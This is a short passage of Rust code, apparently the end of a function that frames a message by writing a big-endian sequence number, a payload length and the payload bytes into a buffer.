    buf.extend_from_slice(&seq.to_be_bytes());
    buf.extend_from_slice(&(payload.len() as u64).to_be_bytes());
    buf.extend_from_slice(payload);
    buf
}
